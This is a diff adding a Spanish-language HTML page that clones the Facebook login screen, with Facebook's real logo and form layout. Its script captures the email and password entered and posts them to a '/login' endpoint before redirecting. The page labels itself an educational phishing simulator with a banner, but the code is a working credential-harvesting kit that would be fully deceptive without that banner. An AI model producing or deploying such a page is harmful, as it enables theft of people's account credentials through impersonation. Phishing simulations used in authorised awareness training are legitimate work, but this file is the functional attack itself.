@@ -1,0 +1,175 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simulador Educativo de Phishing - SOLO PARA FINES EDUCATIVOS</title>
+    <style>
+        body {
+            font-family: Helvetica, Arial, sans-serif;
+            background-color: #f0f2f5;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        
+        .container {
+            display: flex;
+            width: 980px;
+            margin: 0 auto;
+        }
+        
+        .left-section {
+            width: 580px;
+            padding-right: 32px;
+        }
+        
+        .left-section img {
+            width: 300px;
+            margin-bottom: 10px;
+        }
+        
+        .left-section h2 {
+            font-size: 28px;
+            font-weight: normal;
+            line-height: 32px;
+            width: 500px;
+        }
+        
+        .login-form {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px;
+        }
+        
+        .login-form input[type="text"],
+        .login-form input[type="password"] {
+            width: 100%;
+            padding: 14px 16px;
+            font-size: 17px;
+            border-radius: 6px;
+            border: 1px solid #dddfe2;
+            margin-bottom: 12px;
+            box-sizing: border-box;
+        }
+        
+        .login-form input[type="submit"] {
+            background-color: #1877f2;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            margin-bottom: 15px;
+            cursor: pointer;
+        }
+        
+        .login-form input[type="submit"]:hover {
+            background-color: #166fe5;
+        }
+        
+        .login-form .forgotten {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            display: block;
+            text-align: center;
+            margin: 15px 0;
+        }
+        
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        
+        .create-account {
+            background-color: #42b72a;
+            border: none;
+            border-radius: 6px;
+            color: white;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 14px 16px;
+            margin: 10px auto;
+            display: block;
+            cursor: pointer;
+        }
+        
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        
+        .simulation-banner {
+            position: fixed;
+            top: 0;
+            width: 100%;
+            background-color: #f44336;
+            color: white;
+            text-align: center;
+            padding: 10px;
+            font-weight: bold;
+            z-index: 1000;
+        }
+    </style>
+</head>
+<body>
+    <div class="simulation-banner">
+        SIMULADOR EDUCATIVO DE PHISHING - SOLO PARA FINES EDUCATIVOS
+    </div>
+    
+    <div class="container">
+        <div class="left-section">
+            <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook">
+            <h2>Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
+        </div>
+        
+        <div class="right-section">
+            <div class="login-form">
+                <form id="phishing-form">
+                    <input type="text" id="email" placeholder="Correo electrónico o número de teléfono" required>
+                    <input type="password" id="password" placeholder="Contraseña" required>
+                    <input type="submit" value="Iniciar sesión">
+                    <a href="#" class="forgotten">¿Olvidaste tu contraseña?</a>
+                    <div class="divider"></div>
+                    <button type="button" class="create-account">Crear cuenta nueva</button>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('phishing-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            // Capturar los datos ingresados
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Enviar los datos al servidor
+            fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ email, password }),
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.success && data.redirect) {
+                    window.location.href = data.redirect;
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        });
+    </script>
+</body>
+</html>
